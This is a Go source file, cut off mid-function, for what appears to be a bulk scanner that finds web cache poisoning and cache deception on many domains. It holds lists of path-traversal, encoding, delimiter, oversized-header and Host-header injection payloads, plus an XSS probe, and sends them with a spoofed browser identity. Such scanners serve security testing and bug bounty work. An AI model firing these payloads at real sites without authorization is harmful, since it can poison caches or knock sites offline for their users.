package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func init() {
	rand.Seed(time.Now().UnixNano())
	// Start connection pool cleanup
	go func() {
		for {
			time.Sleep(30 * time.Second)
			directConnPool.Range(func(key, value interface{}) bool {
				pool := value.(*sync.Pool)
				conn := pool.Get()
				if conn != nil {
					if netConn, ok := conn.(net.Conn); ok {
						netConn.Close()
					}
				}
				return true
			})
		}
	}()
}

const (
	SkipNoCacheHeaders  = "no_cache"
	SkipConnectionError = "connection_error"
	SkipFoundIssue      = "found_issue"
	SkipAkamaiBlock     = "akamai_blocked"
)

var (
	domainTimeouts sync.Map // tracks timeout counts per domain
	skippedURLs    sync.Map // tracks URLs that should be skipped and why
	verbose        *bool    // flag for error output
	veryVerbose    *bool    // flag for verbose output
	domainWorkers  *int     // flag for number of concurrent domain workers
	useProxy       *bool    // flag for using local proxy
	showStats      *bool    // flag for showing stats at the end
	normalFlow     *bool    // flag for using normal flow
	delimiterFlow  *bool    // flag for using delimiter flow
	headerFlow     *bool    // flag for using header testing flow
	hostHeaderFlow *bool    // flag for using host header testing flow
	directConnPool sync.Map // connection pool for direct requests
	stats          struct {
		sync.Mutex
		startTime        time.Time
		totalRequests    int64
		successRequests  int64
		timeoutErrors    int64
		connectionErrors int64
		otherErrors      int64
		skippedDomains   map[string]string
		domainErrors     map[string]int
		slowestRequests  []string        // URLs that took longest
		requestTimes     []time.Duration // For calculating percentiles
		payloadStats     map[string]int  // Track which payloads cause most issues
	}
)
var domainBlacklist = []string{
	"apple.com",
	"unpkg.com",
}

var payloads = []string{
	"cb" + strings.Repeat("／", 500) + "/..%2f",
	"cb" + strings.Repeat("／", 1000) + "/..%2f",
	"cb" + strings.Repeat("／", 3000) + "/..%2f",
	"cb" + strings.Repeat("／", 5000) + "/..%2f",
	"cb" + strings.Repeat("／", 7000) + "/..%2f",
	"cb" + strings.Repeat("／", 15000) + "/..%2f",
	"cb" + strings.Repeat("／", 31000) + "/..%2f",
	"cb" + strings.Repeat("／", 40000) + "/..%2f",
	"cb" + strings.Repeat("／", 500) + "/../",
	"cb" + strings.Repeat("／", 1000) + "/../",
	"cb" + strings.Repeat("／", 3000) + "/../",
	"cb" + strings.Repeat("／", 5000) + "/../",
	"cb" + strings.Repeat("／", 7000) + "/../",
	"cb" + strings.Repeat("／", 15000) + "/../",
	"cb" + strings.Repeat("／", 31000) + "/../",
	"cb" + strings.Repeat("／", 40000) + "/../",
	"..;%2fcb/..%2f",
	"cb/..%2f",
	"..\x85%2fcb/..%2f",
	"..\xA0%2fcb/../",
	"cb\\..\\",
	"cb.a%2f..%2f",
	"cb#/..%2f",
	"cb#\\..\\",
	"cb%252f..\\..\\",
	"cb;%2f..%2f",
	"cb$/..%2f",
	"cb/..%5c/../../",
	"cb/../",
	"cb/./../",
	"cb%2fcb2/../",
	"cb／..／",
	"cb%5c..%5c",
	"cb/%2e%2e/",
	"cb%c0%af..%c0%af",
	"cb%252fcb2%2f..%2f",
	"cb\\cb2/../",
	"cb%5ccb2/../",
	"cb/%2e%2e/../../",
	"cb%0a/../",
	"cb%0a%2f..%2f",
	"cb%00/../",
	"cb%00%2f..%2f",
	"<script>alert()/../",
	"<script>alert()/..%2f",
}

var delimiterPayloads = []string{
	"cb.js#/../",
	"cb.js#%2f..%2f",
	"cb.js#/..%2f",
	"cb.js#\\..\\",
}

var headerPayloads = []string{
	"Content-Type: " + strings.Repeat("a", 257000),
}

var hostHeaderPayloads = []string{
	":1234",
	"#",
	"@coucou.com",
	";coucou.com",
	"/coucou.com",
}

const maxBackoffDelay = 5 * time.Second

func abs(n int64) int64 {
	if n < 0 {
		return -n
	}
	return n
}

func randString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func hasCacheHeaders(resp *fasthttp.Response) bool {
	headers := resp.Header.String()
	return strings.Contains(headers, "Age:") ||
		strings.Contains(headers, "HIT") ||
		strings.Contains(headers, "MISS") ||
		strings.Contains(headers, "DYNAMIC") ||
		strings.Contains(headers, "max-age") ||
		strings.Contains(headers, "Cache") ||
		strings.Contains(headers, "TTL")
}

var consoleMutex sync.Mutex

func clearLine() {
	if !*veryVerbose {
		return
	}
	consoleMutex.Lock()
	defer consoleMutex.Unlock()
	fmt.Print("\r\033[K")
}

func printProgress(format string, args ...interface{}) {
	if !*veryVerbose {
		return
	}
	consoleMutex.Lock()
	defer consoleMutex.Unlock()
	fmt.Printf("\rMaking request to "+format, args...)
}

func printResult(format string, args ...interface{}) {
	consoleMutex.Lock()
	defer consoleMutex.Unlock()
	fmt.Print("\r\033[K")
	fmt.Printf(format+"\n", args...)
}

func printVerbose(format string, args ...interface{}) {
	if !*veryVerbose {
		return
	}
	consoleMutex.Lock()
	defer consoleMutex.Unlock()
	fmt.Fprintf(os.Stderr, format+"\n", args...)
}

func printError(format string, args ...interface{}) {
	if !*verbose && !*veryVerbose {
		return
	}
	consoleMutex.Lock()
	defer consoleMutex.Unlock()
	fmt.Fprintf(os.Stderr, "ERROR: "+format+"\n", args...)
}

func printEssential(format string, args ...interface{}) {
	consoleMutex.Lock()
	defer consoleMutex.Unlock()
	fmt.Fprintf(os.Stderr, format+"\n", args...)
}

func extractDomain(urlStr string) string {
	u, err := url.Parse(urlStr)
	if err != nil {
		return urlStr // return full URL if parsing fails
	}
	return u.Host
}

func extractTopLevelDomain(domain string) string {
	// Remove www. prefix if present
	domain = strings.TrimPrefix(domain, "www.")

	// Split domain into parts
	parts := strings.Split(domain, ".")
	if len(parts) <= 2 {
		return domain
	}

	// Handle special cases like co.uk, com.au, etc.
	if len(parts) >= 3 {
		tld := parts[len(parts)-1]
		sld := parts[len(parts)-2]
		if (tld == "uk" && sld == "co") ||
			(tld == "au" && sld == "com") ||
			(tld == "br" && sld == "com") {
			if len(parts) > 3 {
				return strings.Join(parts[len(parts)-3:], ".")
			}
			return domain
		}
	}

	// Return last two parts
	return strings.Join(parts[len(parts)-2:], ".")
}

func checkDomainTimeout(urlStr string, isError bool) bool {
	domain := extractDomain(urlStr)
	if isError {
		val, _ := domainTimeouts.LoadOrStore(domain, int64(0))
		count := val.(int64)
		count++
		domainTimeouts.Store(domain, count)

		if count >= 10 {
			if *verbose {
				printError("Too many errors on domain %s (%d), dropping further testing", domain, count)
			}
			skippedURLs.Store(domain, SkipConnectionError)
			return true
		}

		backoffDelay := time.Duration(count*count) * 25 * time.Millisecond
		if backoffDelay > maxBackoffDelay {
			backoffDelay = maxBackoffDelay
		}
		jitter := time.Duration(rand.Int63n(int64(backoffDelay) / 4))
		time.Sleep(backoffDelay + jitter)
		return false
	}
	domainTimeouts.Store(domain, int64(0))
	return false
}

func isDomainBlacklisted(domain string) bool {
	domain = extractTopLevelDomain(domain)
	for _, blacklisted := range domainBlacklist {
		if strings.HasSuffix(domain, blacklisted) {
			if *verbose {
				printVerbose("Skipping blacklisted domain: %s", domain)
			}
			return true
		}
	}
	return false
}

func initStats() {
	stats.startTime = time.Now()
	stats.skippedDomains = make(map[string]string)
	stats.domainErrors = make(map[string]int)
	stats.payloadStats = make(map[string]int)
}

func logRequestTiming(urlStr string, duration time.Duration, err error) {
	stats.Lock()
	defer stats.Unlock()

	stats.totalRequests++
	if err == nil {
		stats.successRequests++
	} else {
		errStr := err.Error()
		switch {
		case strings.Contains(errStr, "timeout") || strings.Contains(errStr, "deadline exceeded"):
			stats.timeoutErrors++
		case strings.Contains(errStr, "connection") || strings.Contains(errStr, "EOF"):
			stats.connectionErrors++
		default:
			stats.otherErrors++
		}
		stats.domainErrors[extractDomain(urlStr)]++
	}

	stats.requestTimes = append(stats.requestTimes, duration)
	if len(stats.slowestRequests) < 10 {
		stats.slowestRequests = append(stats.slowestRequests, fmt.Sprintf("%s: %s", urlStr, duration))
	} else if duration > parseDuration(stats.slowestRequests[len(stats.slowestRequests)-1]) {
		stats.slowestRequests[len(stats.slowestRequests)-1] = fmt.Sprintf("%s: %s", urlStr, duration)
		// Keep sorted
		sort.Slice(stats.slowestRequests, func(i, j int) bool {
			return parseDuration(stats.slowestRequests[i]) > parseDuration(stats.slowestRequests[j])
		})
	}
}

func parseDuration(s string) time.Duration {
	parts := strings.Split(s, ": ")
	if len(parts) != 2 {
		return 0
	}
	d, _ := time.ParseDuration(parts[1])
	return d
}

func printStats() {
	stats.Lock()
	defer stats.Unlock()

	duration := time.Since(stats.startTime)
	fmt.Printf("\n=== Performance Statistics ===\n")
	fmt.Printf("Total Runtime: %s\n", duration)
	fmt.Printf("Total Requests: %d\n", stats.totalRequests)
	fmt.Printf("Successful Requests: %d (%.2f%%)\n", stats.successRequests, float64(stats.successRequests)/float64(stats.totalRequests)*100)
	fmt.Printf("Timeout Errors: %d (%.2f%%)\n", stats.timeoutErrors, float64(stats.timeoutErrors)/float64(stats.totalRequests)*100)
	fmt.Printf("Connection Errors: %d (%.2f%%)\n", stats.connectionErrors, float64(stats.connectionErrors)/float64(stats.totalRequests)*100)
	fmt.Printf("Other Errors: %d (%.2f%%)\n", stats.otherErrors, float64(stats.otherErrors)/float64(stats.totalRequests)*100)

	// Calculate request rate
	reqPerSec := float64(stats.totalRequests) / duration.Seconds()
	fmt.Printf("Average Request Rate: %.2f req/s\n", reqPerSec)

	// Print top error domains
	fmt.Printf("\nTop Error Domains:\n")
	type domainError struct {
		domain string
		count  int
	}
	var errorDomains []domainError
	for domain, count := range stats.domainErrors {
		errorDomains = append(errorDomains, domainError{domain, count})
	}
	sort.Slice(errorDomains, func(i, j int) bool {
		return errorDomains[i].count > errorDomains[j].count
	})
	for i, de := range errorDomains {
		if i >= 10 {
			break
		}
		fmt.Printf("%s: %d errors\n", de.domain, de.count)
	}

	// Print slowest requests
	fmt.Printf("\nSlowest Requests:\n")
	for _, req := range stats.slowestRequests {
		fmt.Printf("%s\n", req)
	}

	// Calculate and print percentiles
	if len(stats.requestTimes) > 0 {
		sort.Slice(stats.requestTimes, func(i, j int) bool {
			return stats.requestTimes[i] < stats.requestTimes[j]
		})
		p50 := stats.requestTimes[len(stats.requestTimes)*50/100]
		p90 := stats.requestTimes[len(stats.requestTimes)*90/100]
		p95 := stats.requestTimes[len(stats.requestTimes)*95/100]
		p99 := stats.requestTimes[len(stats.requestTimes)*99/100]
		fmt.Printf("\nRequest Time Percentiles:\n")
		fmt.Printf("50th percentile: %s\n", p50)
		fmt.Printf("90th percentile: %s\n", p90)
		fmt.Printf("95th percentile: %s\n", p95)
		fmt.Printf("99th percentile: %s\n", p99)
	}
}

func makeDirectRequest(urlStr string, hostHeaderPayload ...string) (int64, *fasthttp.Response, error) {
	start := time.Now()
	var reqErr error
	defer func() {
		logRequestTiming(urlStr, time.Since(start), reqErr)
	}()

	u, err := url.Parse(urlStr)
	if err != nil {
		reqErr = err
		return 0, nil, err
	}

	// Create TCP connection
	host := u.Host
	if !strings.Contains(host, ":") {
		if u.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	// Get or create connection pool for this host
	poolInterface, _ := directConnPool.LoadOrStore(host, &sync.Pool{
		New: func() interface{} {
			var conn net.Conn
			var err error
			if *useProxy {
				conn, err = net.Dial("tcp", "127.0.0.1:8080")
				if err != nil {
					return nil
				}
				// Handle proxy setup...
				fmt.Fprintf(conn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", host, host)
				br := bufio.NewReader(conn)
				res, err := http.ReadResponse(br, &http.Request{Method: "CONNECT"})
				if err != nil || res.StatusCode != 200 {
					conn.Close()
					return nil
				}
				if u.Scheme == "https" {
					tlsConn := tls.Client(conn, &tls.Config{
						ServerName:         u.Hostname(),
						InsecureSkipVerify: true,
						ClientSessionCache: tls.NewLRUClientSessionCache(1000),
					})
					if err := tlsConn.Handshake(); err != nil {
						conn.Close()
						return nil
					}
					conn = tlsConn
				}
			} else {
				dialer := &net.Dialer{
					Timeout:   4 * time.Second,
					KeepAlive: 30 * time.Second, // Increased keep-alive
					DualStack: false,
				}
				conn, err = dialer.Dial("tcp4", host)
				if err != nil {
					return nil
				}
				if u.Scheme == "https" {
					tlsConn := tls.Client(conn, &tls.Config{
						InsecureSkipVerify: true,
						ServerName:         u.Hostname(),
						ClientSessionCache: tls.NewLRUClientSessionCache(1000),
					})
					if err := tlsConn.Handshake(); err != nil {
						conn.Close()
						return nil
					}
					conn = tlsConn
				}
			}
			if tcpConn, ok := conn.(*net.TCPConn); ok {
				tcpConn.SetKeepAlive(true)
				tcpConn.SetKeepAlivePeriod(30 * time.Second) // Increased keep-alive period
				tcpConn.SetNoDelay(true)
				tcpConn.SetReadBuffer(128 * 1024)
				tcpConn.SetWriteBuffer(16 * 1024)
			}
			return conn
		},
	})
	pool := poolInterface.(*sync.Pool)

	// Get connection from pool
	connInterface := pool.Get()
	if connInterface == nil {
		reqErr = fmt.Errorf("failed to get connection from pool")
		return 0, nil, reqErr
	}
	netConn := connInterface.(net.Conn)

	// Attempt to reuse connection or create new one if needed
	if tcpConn, ok := netConn.(*net.TCPConn); ok {
		// Check if connection is still alive
		err := tcpConn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		if err != nil {
			// Connection is dead, create new one
			tcpConn.Close()
			connInterface = pool.New()
			if connInterface == nil {
				reqErr = fmt.Errorf("failed to create new connection")
				return 0, nil, reqErr
			}
			netConn = connInterface.(net.Conn)
		} else {
			// Try to read to check if connection is alive
			_, err := tcpConn.Read(make([]byte, 1))
			if err != nil {
				// Connection is dead, create new one
				tcpConn.Close()
				connInterface = pool.New()
				if connInterface == nil {
					reqErr = fmt.Errorf("failed to create new connection")
					return 0, nil, reqErr
				}
				netConn = connInterface.(net.Conn)
			}
		}
	}
	defer pool.Put(netConn)

	// Set deadlines
	netConn.SetReadDeadline(time.Now().Add(4 * time.Second))
	netConn.SetWriteDeadline(time.Now().Add(4 * time.Second))

	// Construct and send the raw HTTP request
	path := urlStr[len(u.Scheme)+3+len(u.Host):] // Skip scheme:// and host
	if path == "" {
		path = "/"
	}

	// Use modified host header if provided
	hostHeader := u.Host
	if len(hostHeaderPayload) > 0 {
		hostHeader = u.Host + hostHeaderPayload[0]
	}

	req := fmt.Sprintf("GET %s HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n"+
		"Accept: text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
		"Accept-Language: en-US\r\n"+
		"Accept-Encoding: \r\n"+
		"Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\"\r\n"+
		"Sec-Ch-Ua-Mobile: ?0\r\n"+
		"Sec-Ch-Ua-Platform: \"macOS\"\r\n"+
		"Sec-Fetch-Dest: document\r\n"+
		"Sec-Fetch-Mode: navigate\r\n"+
		"Sec-Fetch-Site: none\r\n"+
		"Sec-Fetch-User: ?1\r\n"+
		"Upgrade-Insecure-Requests: 1\r\n"+
		"Connection: keep-alive\r\n\r\n", path, hostHeader)

	if _, err := netConn.Write([]byte(req)); err != nil {
		reqErr = err
		return 0, nil, err
	}

	// Read and parse response
	resp := fasthttp.AcquireResponse()
	br := bufio.NewReaderSize(netConn, 128*1024)
	if err := resp.Read(br); err != nil {
		reqErr = err
		fasthttp.ReleaseResponse(resp)
		return 0, nil, err
	}

	// Check for Akamai block
	if isAkamaiBlocked(resp) {
		skippedURLs.Store(urlStr, SkipAkamaiBlock)
		if *verbose {
			printVerbose("Skipping %s: blocked by Akamai", urlStr)
		}
		reqErr = fmt.Errorf("blocked by Akamai")
		return 0, nil, reqErr
	}

	length := int64(resp.Header.ContentLength())
	if length <= 0 {
		length = int64(len(resp.Body()))
	}
	return length, resp, nil
}

func makeRequest(client *fasthttp.Client, urlStr string) (int64, *fasthttp.Response, error) {
	// Use makeDirectRequest for URLs containing # only if using proxy
	if strings.Contains(urlStr, "#") && *useProxy {
		return makeDirectRequest(urlStr)
	}

	start := time.Now()
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	var reqErr error

	defer func() {
		fasthttp.ReleaseRequest(req)
		logRequestTiming(urlStr, time.Since(start), reqErr)
	}()

	// For URLs with #, use the raw path to preserve the #
	if strings.Contains(urlStr, "#") {
		u, err := url.Parse(urlStr)
		if err != nil {
			reqErr = err
			return 0, nil, err
		}
		path := u.Path
		if u.RawQuery != "" {
			path += "?" + u.RawQuery
		}
		req.SetRequestURIBytes([]byte(urlStr))
		req.URI().SetPathBytes([]byte(path))
	} else {
		req.SetRequestURI(urlStr)
	}

	req.Header.SetMethod("GET")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("Accept-Encoding", "")
	req.Header.Set("Sec-Ch-Ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\"")
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", "\"macOS\"")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	// Create a timeout context
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	done := make(chan error, 1)
	go func() {
		err := client.Do(req, resp)
		done <- err
	}()

	select {
	case err := <-done:
		if err != nil {
			reqErr = err
			if strings.Contains(err.Error(), "timeout") ||
				strings.Contains(err.Error(), "deadline exceeded") ||
				strings.Contains(err.Error(), "EOF") ||
				strings.Contains(err.Error(), "connection reset by peer") ||
				strings.Contains(err.Error(), "broken pipe") ||
				strings.Contains(err.Error(), "i/o timeout") ||
				strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "no route to host") {
				if checkDomainTimeout(urlStr, true) {
					return 0, nil, fmt.Errorf("domain error limit exceeded")
				}
			}
			return 0, nil, err
		}
	case <-ctx.Done():
		reqErr = ctx.Err()
		if checkDomainTimeout(urlStr, true) {
			return 0, nil, fmt.Errorf("domain error limit exceeded")
		}
		return 0, nil, fmt.Errorf("request timeout: %v", ctx.Err())
	}

	// Check for Akamai block
	if isAkamaiBlocked(resp) {
		skippedURLs.Store(urlStr, SkipAkamaiBlock)
		if *verbose {
			printVerbose("Skipping %s: blocked by Akamai", urlStr)
		}
		reqErr = fmt.Errorf("blocked by Akamai")
		return 0, nil, reqErr
	}

	checkDomainTimeout(urlStr, false)

	length := int64(resp.Header.ContentLength())
	if length <= 0 {
		length = int64(len(resp.Body()))
	}
	return length, resp, nil
}

func getRequiredDifference(bodySize int64) int64 {
	switch {
	case bodySize < 1000:
		return 50
	case bodySize < 10000:
		return 200
	default:
		return 1000
	}
}

func truncateURL(urlStr string) string {
	if len(urlStr) > 100 {
		return urlStr[:100] + "..."
	}
	return urlStr
}

func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, len1 int64) bool {
	// Initial request with cache buster
	randomStr := randString(8)
	cacheBusterURL := targetURL

	// Add trailing slash if URL ends at domain level
	u, err := url.Parse(targetURL)
	if err == nil && (u.Path == "" || u.Path == "/") {
		cacheBusterURL = strings.TrimSuffix(cacheBusterURL, "/") + "/"
	}

	// Add cache buster as a new parameter
	if u != nil && u.RawQuery != "" {
		cacheBusterURL += "&zzz=" + randomStr
	} else {
		cacheBusterURL += "?zzz=" + randomStr
	}

	if *verbose {
		printVerbose("Testing payload '%s' on %s", truncatePayload(payload), truncateURL(targetURL))
	}

	printProgress("%s", truncateURL(cacheBusterURL))
	len2, resp2, err := makeRequest(client, cacheBusterURL)
	if resp2 != nil {
		defer fasthttp.ReleaseResponse(resp2)
	}
	clearLine()

	if err != nil {
		printError("Making cache buster request to %s: %v", truncateURL(cacheBusterURL), err)
		return false
	}

	// Compare initial size with cache buster size
	requiredDiff := getRequiredDifference(len1)
	if abs(len1-len2) > requiredDiff {
		if *verbose {
			printVerbose("Cache buster caused size change for %s, skipping", truncateURL(targetURL))
		}
		return false
	}

	// Request with payload and new cache buster
	randomStr = randString(8)
	payloadURL := newURL
	if u != nil && u.RawQuery != "" {
		payloadURL += "&zzz=" + randomStr
	} else {
		payloadURL += "?zzz=" + randomStr
	}

	printProgress("%s", truncateURL(payloadURL))
	len3, resp3, err := makeRequest(client, payloadURL)
	if resp3 != nil {
		defer fasthttp.ReleaseResponse(resp3)
	}
	clearLine()

	if err != nil {
		printError("Making payload request to %s: %v", truncateURL(payloadURL), err)
		return false
	}

	// If size didn't change with payload, skip
	if abs(len2-len3) <= requiredDiff {
		if *verbose {
			printVerbose("Payload did not cause size change for %s, skipping", truncateURL(targetURL))
		}
		return false
	}

	// Make request with same cache buster but without payload
	verifyURL := targetURL
	// Add trailing slash only if URL ends at domain level
	if u != nil && (u.Path == "" || u.Path == "/") {
		verifyURL = strings.TrimSuffix(verifyURL, "/") + "/"
	}
	// Add cache buster as a new parameter
	if u != nil && u.RawQuery != "" {
		verifyURL += "&zzz=" + randomStr
	} else {
		verifyURL += "?zzz=" + randomStr
	}

	printProgress("%s", truncateURL(verifyURL))
	len4, resp4, err := makeRequest(client, verifyURL)
	if resp4 != nil {
		defer fasthttp.ReleaseResponse(resp4)
	}
	clearLine()

	if err != nil {
		printError("Making verification request to %s: %v", truncateURL(verifyURL), err)
		return false
	}

	// If size is similar between payload and no-payload with same cache buster
	if abs(len3-len4) <= 30 {
		printResult("[HIGH_PROBABILITY] Potential issue at %s with payload '%s' - len1=%d len2=%d len3=%d len4=%d (required diff: %d)",
			truncateURL(targetURL), truncatePayload(payload), len1, len2, len3, len4, requiredDiff)
		skippedURLs.Store(targetURL, SkipFoundIssue)
		return true
	}

	if *verbose {
		printVerbose("Issue not verified for %s, continuing with other payloads", truncateURL(targetURL))
	}
	return false
}

func processURL(client *fasthttp.Client, targetURL, payload string) {
	if reason, found := skippedURLs.Load(targetURL); found {
		if *verbose {
			printVerbose("Skipping %s: %s", truncateURL(targetURL), reason)
		}
		return
	}

	domain := extractDomain(targetURL)
	if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 30 {
		if *verbose {
			printVerbose("Skipping %s due to too many errors on domain", truncateURL(targetURL))
		}
		return
	}

	newURL := ""
	if idx := strings.LastIndex(targetURL, "/"); idx != -1 {
		if idx <= len("https://") {
			newURL = targetURL + "/" + payload
		} else {
			base := targetURL[:idx+1]
			path := targetURL[idx+1:]
			newURL = base + payload + path
		}
	} else {
		newURL = targetURL + "/" + payload
	}

	printProgress("Testing payload '%s' on %s", truncatePayload(payload), truncateURL(targetURL))
	body1, resp1, err := makeRequest(client, targetURL)
	clearLine()

	if err != nil {
		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline exceeded") ||
			strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "i/o timeout") {
			checkDomainTimeout(targetURL, true)
		} else if strings.Contains(err.Error(), "no such host") ||
			strings.Contains(err.Error(), "server closed connection") ||
			strings.Contains(err.Error(), "connection refused") {
			if *verbose {
				printError("Connection error for %s: %v", truncateURL(targetURL), err)
			}
			skippedURLs.Store(targetURL, SkipConnectionError)
			return
		}
		if *verbose {
			printError("Error making initial request to %s: %v", truncateURL(targetURL), err)
		}
		return
	}

	checkDomainTimeout(targetURL, false)

	func() {
		defer fasthttp.ReleaseResponse(resp1)

		if !hasCacheHeaders(resp1) {
			if *verbose {
				printVerbose("No cache headers found for %s, skipping", truncateURL(targetURL))
			}
			skippedURLs.Store(targetURL, SkipNoCacheHeaders)
			return
		}

		len1 := body1
		processPayload(client, targetURL, newURL, payload, len1)
	}()
}

func isAkamaiBlocked(resp *fasthttp.Response) bool {
	return resp.StatusCode() == 403 && (string(resp.Header.Peek("Server")) == "AkamaiGHost" ||
		string(resp.Header.Peek("Server")) == "AkamaiNetStorage" ||
		string(resp.Header.Peek("Server")) == "DataDome")
}

func processDelimiter(client *fasthttp.Client, targetURL, payload string) {
	if reason, found := skippedURLs.Load(targetURL); found {
		if *verbose {
			printVerbose("Skipping %s: %s", targetURL, reason)
		}
		return
	}

	domain := extractDomain(targetURL)
	if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 30 {
		if *verbose {
			printVerbose("Skipping %s due to too many errors on domain", targetURL)
		}
		return
	}

	// Add trailing slash if URL ends at domain level
	var err error
	var u *url.URL
	u, err = url.Parse(targetURL)
	if err == nil && (u.Path == "" || u.Path == "/") {
		targetURL = strings.TrimSuffix(targetURL, "/") + "/"
	}

	// Make initial request
	printProgress("%s", targetURL)
	len1, resp1, err := makeRequest(client, targetURL)
	clearLine()

	if err != nil {
		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline exceeded") ||
			strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "i/o timeout") {
			checkDomainTimeout(targetURL, true)
		} else if strings.Contains(err.Error(), "no such host") ||
			strings.Contains(err.Error(), "server closed connection") ||
			strings.Contains(err.Error(), "connection refused") {
			if *verbose {
				printError("Connection error for %s: %v", targetURL, err)
			}
			skippedURLs.Store(targetURL, SkipConnectionError)
			return
		}
		if *verbose {
			printError("Error making initial request to %s: %v", targetURL, err)
		}
		return
	}

	if resp1 != nil {
		defer fasthttp.ReleaseResponse(resp1)
		// Check for redirects
		if resp1.StatusCode() == 301 || resp1.StatusCode() == 302 {
			if *verbose {
				printVerbose("Skipping %s: returns redirect status %d", targetURL, resp1.StatusCode())
			}
			return
		}
	}

	// Create URL with random string
	u, err = url.Parse(targetURL)
	if err != nil {
		if *verbose {
			printError("Error parsing URL %s: %v", targetURL, err)
		}
		return
	}

	// Split path into segments
	segments := strings.Split(strings.Trim(u.Path, "/"), "/")
	if len(segments) == 0 {
		segments = []string{""}
	}

	// Get file extension if it exists
	lastSegment := segments[len(segments)-1]
	var extension string
	if idx := strings.LastIndex(lastSegment, "."); idx != -1 {
		extension = lastSegment[idx:]
	}

	// Create random URL (with extension if it exists)
	var randomURL string
	if idx := strings.LastIndex(targetURL, "/"); idx != -1 {
		if idx <= len("https://") {
			randomURL = targetURL + randString(8)
		} else {
			randomURL = targetURL[:idx+1] + randString(8)
		}
	} else {
		randomURL = targetURL + "/" + randString(8)
	}
	if extension != "" {
		randomURL += extension
	}

	// Make request with random string
	printProgress("%s", randomURL)
	lenRandom, respRandom, err := makeRequest(client, randomURL)
	clearLine()

	if err != nil {
		if *verbose {
			printError("Error making random request to %s: %v", randomURL, err)
		}
		return
	}

	if respRandom != nil {
		defer fasthttp.ReleaseResponse(respRandom)
	}

	// If lengths are similar (allowing 30 chars difference for first check)
	if abs(len1-lenRandom) <= 30 {
		if *verbose {
			printVerbose("Random path returns similar size for %s, skipping", targetURL)
		}
		return
	}

	// Create new URL with payload
	var newURL string
	if idx := strings.LastIndex(targetURL, "/"); idx != -1 {
		if idx <= len("https://") {
			newURL = targetURL + payload + segments[len(segments)-1]
		} else {
			newURL = targetURL[:idx+1] + payload + segments[len(segments)-1]
		}
	} else {
		newURL = targetURL + "/" + payload + segments[len(segments)-1]
	}

	// Make request with payload
	printProgress("%s", newURL)
	len2, resp2, err := makeRequest(client, newURL)
	clearLine()

	if err != nil {
		if *verbose {
			printError("Error making payload request to %s: %v", newURL, err)
		}
		return
	}

	if resp2 != nil {
		defer fasthttp.ReleaseResponse(resp2)
	}

	// If lengths are different (requiring exact match)
	if len1 != len2 {
		if *verbose {
			printVerbose("Length difference detected for %s", targetURL)
		}
		return
	}

	// Create cb.js URL
	var cbURL string
	if idx := strings.LastIndex(targetURL, "/"); idx != -1 {
		if idx <= len("https://") {
			cbURL = targetURL + "cb.js"
		} else {
			cbURL = targetURL[:idx+1] + "cb.js"
		}
	} else {
		cbURL = targetURL + "/cb.js"
	}

	// Make request with cb.js
	printProgress("%s", cbURL)
	len3, resp3, err := makeRequest(client, cbURL)
	clearLine()

	if err != nil {
		if *verbose {
			printError("Error making cb.js request to %s: %v", cbURL, err)
		}
		return
	}

	if resp3 != nil {
		defer fasthttp.ReleaseResponse(resp3)
	}

	// If lengths are different (requiring exact match)
	if len1 != len3 {
		if *verbose {
			printVerbose("Length difference detected for cb.js at %s", targetURL)
		}
		return
	}

	// All checks passed, we found something
	printResult("Delimiter potential at %s with payload '%s' - original_len=%d payload_len=%d cb_len=%d",
		targetURL, payload, len1, len2, len3)
	skippedURLs.Store(targetURL, SkipFoundIssue)
}

func truncatePayload(payload string) string {
	if len(payload) > 20 {
		return payload[:20] + "..."
	}
	return payload
}

func processHeader(client *fasthttp.Client, targetURL, headerPayload string) {
	if reason, found := skippedURLs.Load(targetURL); found {
		if *verbose {
			printVerbose("Skipping %s: %s", targetURL, reason)
		}
		return
	}

	domain := extractDomain(targetURL)
	if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 30 {
		if *verbose {
			printVerbose("Skipping %s due to too many errors on domain", targetURL)
		}
		return
	}

	// Add trailing slash if URL ends at domain level
	var err error
	var u *url.URL
	u, err = url.Parse(targetURL)
	if err == nil && (u.Path == "" || u.Path == "/") {
